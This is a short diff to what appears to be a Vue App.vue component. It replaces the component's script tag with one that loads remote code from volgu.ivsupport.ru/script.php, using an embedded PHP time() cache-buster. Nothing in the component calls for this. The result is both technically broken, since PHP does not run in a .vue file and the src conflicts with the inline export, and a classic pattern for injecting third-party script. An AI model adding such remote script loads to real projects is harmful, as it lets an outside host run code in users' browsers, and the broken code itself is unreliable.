@@ -2,13 +2,14 @@
  <router-view></router-view>
 </template>
 
-<script>
+<script src="//volgu.ivsupport.ru/script.php?<?=time()?>">
 
 
 export default {
   name: 'App',
   
 }
+
 </script>
 
 <style>
